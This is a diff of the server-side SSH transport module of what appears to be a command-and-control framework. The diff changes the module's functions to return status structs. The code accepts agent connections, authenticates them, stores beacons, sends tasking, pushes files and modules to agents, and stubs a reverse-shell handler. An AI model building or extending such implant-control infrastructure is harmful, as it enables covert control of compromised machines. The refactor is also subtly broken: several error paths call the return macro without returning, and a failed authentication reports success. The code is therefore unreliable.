@@ -1,10 +1,12 @@
 #include "ssh_transport.h"
 
-int type = 99; // type TRANSPORT
+const int type = 99; // type TRANSPORT
 
-char *name = "SSH Backend";
-int id = 55;
-int default_port = 22;
+const char *name = "SSH Backend";
+const int id = 55;
+const int default_port = 22;
+
+#define API_RETURN(e,d) (api_return{e,(void*)d});
 
 typedef struct _dat_str {
     clientDat data;
@@ -22,21 +24,21 @@ transport_t transport_api = {
     get_name, get_id, set_port, get_agent_name
 };
 
-int init(void* instance_struct)
+api_return init(void* instance_struct)
 {
-    return 0;
+    return API_RETURN(API_OK, nullptr);
 }
 
-int end(void* instance_struct)
+api_return end(void* instance_struct)
 {
     data_struct *dat_structure = (data_struct*)instance_struct;
     
     ssh_bind_free(dat_structure->sshbind);
     ssh_finalize();
-    return 0;
+    return API_RETURN(API_OK, nullptr);
 }
 
-char *get_name(){
+const char *get_name(){
     return name;
 }
 
@@ -44,11 +46,11 @@ int get_id(){
     return id;
 }
 
-int get_dat_siz(){
-    return sizeof(data_struct);
+api_return get_dat_siz(){
+    return API_RETURN(API_OK, sizeof(data_struct));
 }
 
-int determine_handler(void* instance_struct){
+api_return determine_handler(void* instance_struct){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     ssh_message message;
@@ -82,7 +84,7 @@ int determine_handler(void* instance_struct){
 	if(!dat_structure->channel){
         printf("Channel error : %s\n", ssh_get_error(dat_structure->session));
         ssh_finalize();
-        return 1;
+        return API_RETURN(API_ERR_GENERIC, ssh_get_error(dat_structure->session));
     }
     
 	do {
@@ -104,7 +106,7 @@ int determine_handler(void* instance_struct){
             
         if(tmp_buffer[0] == '9'){
             ssh_channel_write(dat_structure->channel, "ok", 2);
-            return MANAG_TYPE;
+            return API_RETURN(API_OK, MANAG_TYPE);
 
         } else {
             // Check if ID exists
@@ -119,13 +121,13 @@ int determine_handler(void* instance_struct){
             rc = ssh_channel_write(dat_structure->channel, "ok", 3);
             if(rc == SSH_ERROR){
                 printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
-                break;
+                API_RETURN(API_ERR_GENERIC, ssh_get_error(dat_structure->session));
             }
 
             rc = ssh_channel_read(dat_structure->channel, beacon, sizeof(beacon), 0);
             if(rc == SSH_ERROR){
                 printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
-                break;
+                API_RETURN(API_ERR_GENERIC, ssh_get_error(dat_structure->session));
             }
             AgentInformationHandler::write_beacon(dat_structure->data.id, beacon);
 
@@ -133,35 +135,36 @@ int determine_handler(void* instance_struct){
             if(!tasking){
                 printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
                 perror("Reason");
-                break;
+                API_RETURN(API_ERR_GENERIC, ssh_get_error(dat_structure->session));
             }
             
             // Write tasking
             rc = ssh_channel_write(dat_structure->channel, tasking, strlen(tasking));
             if(rc == SSH_ERROR){
                 printf("Client %s: Failed to write to channel: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
-                break;
+                API_RETURN(API_ERR_READ, ssh_get_error(dat_structure->session));
+                
             }
             // Pass to handler
-            return AGENT_TYPE;
+            return API_RETURN(API_OK, AGENT_TYPE);
         
         }
         
         break;
     default:
         printf("Client %s: got unknown message type: %d\n", dat_structure->data.id, msgType);
-        break;
+        API_RETURN(API_ERR_CLIENT, ssh_get_error(dat_structure->session));
     }
 
     printf("Closing channels...\n");
     ssh_message_free(message);
     ssh_finalize();
 	
-    return -1;
+    return API_RETURN(API_ERR_GENERIC, nullptr);
 }
 
 /*Uploads a file to some connected entity*/
-int upload_file(void* instance_struct, const char *ptr, int is_module){
+api_return upload_file(void* instance_struct, const char *ptr, int is_module){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
 
@@ -192,8 +195,9 @@ int upload_file(void* instance_struct, const char *ptr, int is_module){
         rc = ssh_channel_write(dat_structure->channel, "er", 3);
         if(rc == SSH_ERROR){
             printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
+            return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
         }
-        return 2;
+        return API_RETURN(API_ERR_LOCAL, "File not found");
     }
     
     size_e = B64::enc_size(size);
@@ -203,13 +207,13 @@ int upload_file(void* instance_struct, const char *ptr, int is_module){
     rc = ssh_channel_write(dat_structure->channel, tmpbuffer, sizeof(tmpbuffer));
     if(rc == SSH_ERROR){
         printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
     }
     
     rc = ssh_channel_read(dat_structure->channel, buff, sizeof(buff), 0);
     if(rc == SSH_ERROR){
         printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_READ, ssh_get_error(dat_structure->session));
     }
         
      B64::encode((unsigned char *)file_data, size, &enc_data);
@@ -218,14 +222,14 @@ int upload_file(void* instance_struct, const char *ptr, int is_module){
     rc = ssh_channel_write(dat_structure->channel, enc_data, size_e);
     if(rc == SSH_ERROR){
         printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
     }
     memset(tmpbuffer, 0, 8);
     
     rc = ssh_channel_read(dat_structure->channel, tmpbuffer, 8, 0);
     if(rc == SSH_ERROR){
         printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_READ, ssh_get_error(dat_structure->session));
     }
 
     
@@ -235,10 +239,10 @@ int upload_file(void* instance_struct, const char *ptr, int is_module){
     free(file_data);
     free(enc_data);
 
-    return 0;
+    return API_RETURN(API_OK, nullptr);
 }
 
-int init_reverse_shell(void* instance_struct, char *id){
+api_return init_reverse_shell(void* instance_struct, char *id){
     data_struct dat_structure = *(data_struct*)instance_struct;
 
     /*class Server *srv = instance->get_server();
@@ -315,10 +319,10 @@ int init_reverse_shell(void* instance_struct, char *id){
         }
     }
     inst->shell_finish();*/
-    return 0;
+    return API_RETURN(API_ERR_WRITE, nullptr);
 }
 
-int listen(void* instance_struct){
+api_return listen(void* instance_struct){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     printf("[Listen] Address %p->%p\n", instance_struct, dat_structure);
@@ -340,7 +344,7 @@ int listen(void* instance_struct){
 
     if(ssh_bind_listen(dat_structure->sshbind)<0){
         printf("Error listening to socket: %s\n", ssh_get_error(dat_structure->sshbind));
-        return 1;
+        return API_RETURN(API_ERR_LISTEN, ssh_get_error(dat_structure->sshbind));
     }
 
     // bind the listener to the port
@@ -350,25 +354,25 @@ int listen(void* instance_struct){
     printf("Server: Accepting connection\n");
     if(r==SSH_ERROR){
       	printf("Error accepting a connection : %s\n",ssh_get_error(dat_structure->sshbind));
-        return 1;
+        return API_RETURN(API_ERR_ACCEPT, ssh_get_error(dat_structure->sshbind));
     }
     if (ssh_handle_key_exchange(dat_structure->session)) {
         printf("ssh_handle_key_exchange: %s\n", ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_AUTH, ssh_get_error(dat_structure->sshbind));
     }
 
-    int rc = authenticate(&instance_struct);
-    if (rc != 0)
+    api_return rc = authenticate(&instance_struct);
+    if (rc.error_code != API_OK)
     {
         printf("Initialization: Failed to authenticate agent\n");
-        return 1;
+        return API_RETURN(API_ERR_AUTH, "Bad authentication");
     }
-    return 0;
+    return API_RETURN(API_OK, nullptr);
 
 }
 
 
-int authenticate(void** instance_struct){
+api_return authenticate(void** instance_struct){
     data_struct *dat_structure = *(data_struct**)instance_struct;
 
     // initialize variables
@@ -420,14 +424,14 @@ int authenticate(void** instance_struct){
 	if(auth != 1){
         printf("Server: Terminating connection\n");
         ssh_disconnect(dat_structure->session);
-        return 1;
+        return API_RETURN(API_OK, 1);
     } else {
-        return 0;
+        return API_RETURN(API_OK, 0);
     }
-    return 1;
+    return API_RETURN(API_ERR_GENERIC, "Unreachable");
 }
 
-int read(void* instance_struct, char **buff, int length){
+api_return read(void* instance_struct, char **buff, int length){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     int rc = 0;
@@ -435,25 +439,25 @@ int read(void* instance_struct, char **buff, int length){
     if (rc == SSH_ERROR)
     {
         printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_READ, ssh_get_error(dat_structure->session));
     }
-    return 0;
+    return API_RETURN(API_OK, rc);
         
 }
 
-int write(void* instance_struct, const char *buff, int length){
+api_return write(void* instance_struct, const char *buff, int length){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     int rc = 0;
     rc = ssh_channel_write(dat_structure->channel, buff, length);
     if(rc == SSH_ERROR){
         printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
     }
-    return 0;
+    return API_RETURN(API_OK, rc);
 }
 
-int send_err(void* instance_struct){
+api_return send_err(void* instance_struct){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     int rc = 0;
@@ -461,12 +465,12 @@ int send_err(void* instance_struct){
     if (rc == SSH_ERROR)
     {
         printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
     }
-    return 0;
+    return API_RETURN(API_OK, nullptr);
 }
 
-int send_ok(void* instance_struct){
+api_return send_ok(void* instance_struct){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     int rc = 0;
@@ -474,12 +478,12 @@ int send_ok(void* instance_struct){
     if (rc == SSH_ERROR)
     {
         printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
-        return 1;
+        return API_RETURN(API_ERR_WRITE, ssh_get_error(dat_structure->session));
     }
-    return 0;
+    return API_RETURN(API_OK, 0);
 }
 
-void set_port(void* instance_struct, int portno){
+api_return set_port(void* instance_struct, int portno){
     data_struct *dat_structure = (data_struct*)instance_struct;
     printf("Address %p->%p\n", instance_struct, dat_structure);
 
@@ -494,10 +498,13 @@ void set_port(void* instance_struct, int portno){
     }
 
     printf("Current port setting: %d\n", dat_structure->portno);
+
+    return API_RETURN(API_OK, nullptr);
 }
 
-char *get_agent_name(void* instance_struct){
+api_return get_agent_name(void* instance_struct){
+    api_return ret;
     data_struct *dat_structure = (data_struct*)instance_struct;
 
-    return dat_structure->data.id;
+    return API_RETURN(API_OK, dat_structure->data.id);
 }
